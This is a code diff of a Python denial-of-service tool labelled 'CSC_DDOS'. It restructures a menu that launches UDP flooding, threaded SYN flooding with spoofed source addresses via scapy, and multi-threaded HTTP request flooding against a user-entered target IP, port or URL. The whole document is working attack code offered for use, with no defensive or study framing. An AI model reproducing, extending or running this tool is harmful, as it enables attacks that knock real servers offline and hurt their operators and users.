@@ -54,100 +54,89 @@ def logo():
           """ + TextColors.RESET)
 
 logo()
+while True:
+    def menu():
+        print(TextColors.RED + "--------------------------------" + TextColors.RESET)
+        print(TextColors.RED + "[1] UDP FLOODING" + TextColors.RESET)
+        print(TextColors.RED + "[2] SYN FLOODING" + TextColors.RESET)
+        print(TextColors.RED + "[3] HTTP FLOODING"  + TextColors.RESET)
+        print(TextColors.RED + "-------------------------------- \n" + TextColors.RESET)
 
-def menu():
-    print(TextColors.RED + "--------------------------------" + TextColors.RESET)
-    print(TextColors.RED + "[1] UDP FLOODING" + TextColors.RESET)
-    print(TextColors.RED + "[2] SYN FLOODING" + TextColors.RESET)
-    print(TextColors.RED + "[3] HTTP FLOODING"  + TextColors.RESET)
-    print(TextColors.RED + "-------------------------------- \n" + TextColors.RESET)
+    menu()
 
-menu()
+    select = input(TextColors.WHITE + "CSC_DDOS:~$ : " + TextColors.RESET)
 
-select = input(TextColors.WHITE + "CSC_DDOS:~$ : " + TextColors.RESET)
+    # UDP FLOODING
 
-# UDP FLOODING
+    if select == "1" or select == "UDP":
+        def udp_flood(target_ip, target_port, packet_count):
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            bytes_to_send = random._urandom(2024)  
 
-if select == "1" or select == "UDP":
- def udp_flood(target_ip, target_port, packet_count):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes_to_send = random._urandom(2024)  
+            for _ in range(packet_count):
+                sock.sendto(bytes_to_send, (target_ip, target_port))
+                print(TextColors.RED + f"[*] UDP FLOODING PACKET : {target_ip}:{target_port}" + TextColors.RESET)
 
-    for _ in range(packet_count):
-        sock.sendto(bytes_to_send, (target_ip, target_port))
-        print(TextColors.RED + f"[*] UDP FLOODING PACKET : {target_ip}:{target_port}" + TextColors.RESET)
-
-    if __name__ == "__main__":
+            
         target_ip = input("[+] TARGET IP : ")  
         target_port = int(input("[+] PORT : ")) 
         packet_count = int(input("[+] PACKET? : ")) 
-        
+            
         udp_flood(target_ip, target_port, packet_count)
 
-# SYN FLOODING
+    # SYN FLOODING
 
-if select == "2" or select == "SYN":
- class SynFlood(Thread):
-    def __init__(self, dst_IP, dst_PORT):
-        Thread.__init__(self)
-        self.dst_IP = dst_IP
-        self.dst_PORT = dst_PORT
-        self.running = True
-        self.intercount = 0
+    if select == "2" or select == "SYN":
+        class SynFlood(Thread):
+            def __init__(self, dst_IP, dst_PORT):
+                Thread.__init__(self)
+                self.dst_IP = dst_IP
+                self.dst_PORT = dst_PORT
+                self.running = True
+                self.intercount = 0
 
-    def run(self):
-        while self.running:
-            syn_packet = IP(src=RandIP(), dst=self.dst_IP) / TCP(flags='S', sport=RandShort(), dport=self.dst_PORT)
-            send(syn_packet, verbose=0)  
-            print(TextColors.RED + f'[+] SYNFLOOD PACKET : {self.intercount}' + TextColors.RESET)  
-            self.intercount += 1
+            def run(self):
+                while self.running:
+                    syn_packet = IP(src=RandIP(), dst=self.dst_IP) / TCP(flags='S', sport=RandShort(), dport=self.dst_PORT)
+                    send(syn_packet, verbose=0)  
+                    print(TextColors.RED + f'[+] SYNFLOOD PACKET : {self.intercount}' + TextColors.RESET)  
+                    self.intercount += 1
 
-    def main():
-        dst_IP = input('[+] TARGET IP : ')
-        dst_PORT = int(input('[+] PORT : '))
-        run_thread = int(input('[+] Threads ✅ : '))
-        
-        threads = []
-        for _ in range(run_thread):
-            sf = SynFlood(dst_IP, dst_PORT)
-            threads.append(sf)
-            sf.start()
+        def main():
+            dst_IP = input('[+] TARGET IP : ')  # IP는 문자열로 처리해야 합니다
+            dst_PORT = int(input('[+] PORT : '))
+            run_thread = int(input('[+] Threads ✅ : '))
 
-    if __name__ == '__main__':
+            threads = []
+            for _ in range(run_thread):
+                sf = SynFlood(dst_IP, dst_PORT)
+                threads.append(sf)
+                sf.start()
+
         main()
 
-# HTTP FLOODING
+    # HTTP FLOODING
 
-if select == "3" or select == "HTTP":
-    def flood(url):    
-        while True:
-            try:
-                headers = {'User-Agent': random.choice(user_agents)}
-                response = requests.get(url, headers=headers)
-                print(f"[+] TARGET REQUEST ✅ {url}, : [*] SERVER 🌐 : {response.status_code} ")
-            except requests.exceptions.RequestException as e:
-                print(f"Error: {e}")
+    if select == "3" or select == "HTTP":
+        def flood(url):    
+            while True:
+                try:
+                    headers = {'User-Agent': random.choice(user_agents)}
+                    response = requests.get(url, headers=headers)
+                    print(f"[+] TARGET REQUEST ✅ {url}, : [*] SERVER 🌐 : {response.status_code} ")
+                except requests.exceptions.RequestException as e:
+                    print(f"Error: {e}")
 
-    def start_flooding():
-        target_url = input("[+] TARGET URL : ")
-        print("[+] CSC DDOS HTTP FLOOD")
-        
-        for i in range(100000000): 
-            thread = threading.Thread(target=flood, args=(target_url,))
-            thread.start()
+        def start_flooding():
+            target_url = input("[+] TARGET URL : ")
+            http_thread = int(input('[+] Threads ✅ : '))
+            print("[+] CSC DDOS HTTP FLOOD")
+            
+            for i in range(http_thread): 
+                thread = threading.Thread(target=flood, args=(target_url,))
+                thread.start()
 
-    if __name__ == "__main__":
-        while True:
-            print(TextColors.RED + "[1] HTTP FLOODING " + TextColors.RESET)
-            print(TextColors.RED + "[2] Exit " + TextColors.RESET)
-            choice = input("CSC_DDOS:~$ : ")
-            if choice == '1':
-                start_flooding()
-            elif choice == '2':
-                print("Exiting...")
-                break
-            else:
-                print("OPTION FAIL")
+        start_flooding()
 
 
     
